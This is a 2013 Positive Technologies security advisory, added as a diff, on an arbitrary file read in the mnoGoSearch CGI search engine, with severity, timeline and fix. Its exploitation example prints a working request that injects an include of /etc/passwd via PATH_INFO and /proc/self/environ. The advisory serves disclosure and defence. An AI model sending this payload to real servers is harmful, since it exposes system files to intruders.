@@ -1,0 +1,86 @@
+-----------------------------------------------------------
+(PT-2013-17) Positive Technologies Security Advisory 
+Arbitrary Files Reading in mnoGoSearch
+-----------------------------------------------------------
+
+---[ Vulnerable software ]
+
+mnoGoSearch 
+Version: 3.3.12 and earlier
+
+Application link: 
+http://www.mnogosearch.org/
+
+---[ Severity level ]
+
+Severity level:	High 
+Impact:	 Arbitrary Files Reading 
+Access Vector:	Remote 
+CVSS v2: 
+Base Score: 7.8 
+Vector: (AV:N/AC:L/Au:N/C:C/I:N/A:N)
+
+CVE: not assigned
+
+---[ Software description ]
+
+mnoGoSearch is a universal Intranet and Internet search engine.
+
+---[ Vulnerability description ]
+
+Positive Technologies experts have detected an Arbitrary Files Reading vulnerability in mnoGoSearch.
+
+Passing startup parameters via QUERY_STRING (http://tools.ietf.org/html/draft-robinson-www-interface-00#section-7) for
+an application running in CGI mode can be used to set page template path variable "d". Generating a template
+file on the server and specifying it in the variable "d" can result in Arbitrary Files Reading via
+<!INCLUDE CONTENT="URI"> template structure. 
+---[ Exploitation example] 
+The /proc/self/environ file, in which part of the template is formed through the PATH_INFO environment variable, can be
+used as a template. 
+<!--top--> 
+<!INCLUDE CONTENT="file:/etc/passwd"> 
+<!--/top-->
+
+http://host/cgi-bin/search.cgi/%0A%3C!--top--%3E%0A%3C!INCLUDE%20CONTENT=%22file:/etc/passwd%22%3E%0A%3C!--/top--%3E?-d/
+proc/self/environ
+
+---[ How to fix ]
+
+Update your software up to the latest version.
+
+---[ Advisory status ]
+
+15.02.2013 - Vendor gets vulnerability details 
+01.03.2013 - Vendor releases fixed version and details 
+05.03.2013 - Public disclosure
+
+---[ Credits ]
+
+The vulnerabilities has discovered by Sergey Bobrov, Positive Technologies Company
+
+---[ References ]
+
+http://en.securitylab.ru/lab/PT-2013-17 
+http://www.mnogosearch.org/bugs/index.php?id=4818 
+
+Reports on the vulnerabilities previously discovered by Positive Research:
+
+http://ptsecurity.com/research/advisory/ 
+http://en.securitylab.ru/lab/
+
+---[ About Positive Technologies ]
+
+Positive Technologies www.ptsecurity.com is among the key players in the IT security market in Russia.
+
+The principal activities of the company include the development of integrated tools for information security monitoring
+(MaxPatrol); providing IT security consulting services and technical support; development of the Securitylab leading
+Russian information security portal.
+
+Among the clients of Positive Technologies, there are more than 40 state enterprises, more than 50 banks and financial
+organizations, 20 telecommunication companies, more than 40 plant facilities, as well as IT, service and retail
+companies from Russia, the CIS countries, the Baltic States, China, Ecuador, Germany, Great Britain, Holland, Iran,
+Israel, Japan, Mexico, the Republic of South Africa, Thailand, Turkey, and the USA.
+
+Positive Technologies is a team of highly skilled developers, advisers and experts with years of vast hands-on
+experience. The company specialists possess professional titles and certificates; they are the members of various
+international societies and are actively involved in the IT security field development.
